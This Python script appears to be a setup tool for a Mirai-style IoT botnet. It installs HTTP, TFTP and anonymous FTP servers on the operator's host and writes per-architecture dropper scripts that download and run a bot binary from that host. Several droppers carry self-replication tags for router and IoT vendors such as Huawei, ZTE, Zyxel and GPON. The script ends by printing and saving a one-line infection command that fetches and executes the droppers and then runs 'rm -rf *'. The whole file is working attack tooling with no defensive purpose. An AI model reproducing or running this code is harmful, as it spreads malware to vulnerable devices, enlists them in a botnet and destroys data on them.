import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "payf"
exec_name = "pay"
bin_prefix = "Yboats."
bin_directory = ""
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"spc",                        #12
"i686",                       #13
"sh4",                        #12
"arc"]                       #11


def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/zeros6x.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/zeros6x.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/zeros6x.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/zeros6x2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/zeros6x2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/zeros6x2.sh')

run('echo "#!/bin/bash" > /var/ftp/D4op.sh')
run('echo "ulimit -n 1024" >> /var/ftp/D4op.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/D4op.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/jaws')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/jaws')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/jaws')

run('echo "#!/bin/bash" > /var/www/html/zeros6x.sh')
run('echo "#!/bin/bash" > /var/www/html/yarn')
run('echo "#!/bin/bash" > /var/www/html/hnap')
run('echo "#!/bin/bash" > /var/www/html/aws')
run('echo "#!/bin/bash" > /var/www/html/gpon443')
run('echo "#!/bin/bash" > /var/www/html/huawei')
run('echo "#!/bin/bash" > /var/www/html/zyxel')
run('echo "#!/bin/bash" > /var/www/html/zte')
run('echo "#!/bin/bash" > /var/www/html/realtek')
run('echo "#!/bin/bash" > /var/www/html/pulse')
run('echo "#!/bin/bash" > /var/www/html/lg')
run('echo "#!/bin/bash" > /var/www/html/goahead')
run('echo "#!/bin/bash" > /var/www/html/thinkphp')
run('echo "#!/bin/bash" > /var/www/html/comtrend')
run('echo "#!/bin/bash" > /var/www/html/jaws')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/www/html/zeros6x.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' aws.selfrep" >> /var/www/html/aws')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' lg.selfrep" >> /var/www/html/lg')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' jaws.selfrep" >> /var/www/html/jaws')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' hnap.selfrep" >> /var/www/html/hnap')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' pulse.selfrep" >> /var/www/html/pulse')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' gpon443.selfrep" >> /var/www/html/gpon443')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' thinkphp.selfrep" >> /var/www/html/thinkphp')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' huawei.selfrep" >> /var/www/html/huawei')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' zte.selfrep" >> /var/www/html/zte')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' yarn.selfrep" >> /var/www/html/yarn')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' zyxel.selfrep" >> /var/www/html/zyxel')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' realtek.selfrep" >> /var/www/html/realtek')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' goahead.selfrep" >> /var/www/html/goahead')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/ftp/D4op.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/zeros6x.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/zeros6x2.sh')    
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' comtrend.selfrep" >> /var/lib/tftpboot/comtrend')    
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' jaws.selfrep" >> /var/lib/tftpboot/jaws')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n999999; ulimit -u999999; ulimit -e999999" >> ~/.bashrc')
run
print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/zeros6x.sh; curl -O http://" + ip + "/zeros6x.sh; chmod 777 zeros6x.sh; sh zeros6x.sh; tftp " + ip + " -c get zeros6x.sh; chmod 777 zeros6x.sh; sh zeros6x.sh; tftp -r zeros6x2.sh -g " + ip + "; chmod 777 zeros6x2.sh; sh zeros6x2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " D4op.sh D4op.sh; sh D4op.sh; rm -rf zeros6x.sh zeros6x.sh zeros6x2.sh D4op.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/zeros6x.sh; curl -O http://" + ip + "/zeros6x.sh; chmod 777 zeros6x.sh; sh zeros6x.sh; tftp " + ip + " -c get zeros6x.sh; chmod 777 zeros6x.sh; sh zeros6x.sh; tftp -r zeros6x2.sh -g " + ip + "; chmod 777 zeros6x2.sh; sh zeros6x2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " D4op.sh D4op.sh; sh D4op.sh; rm -rf zeros6x.sh zeros6x.sh zeros6x2.sh D4op.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")
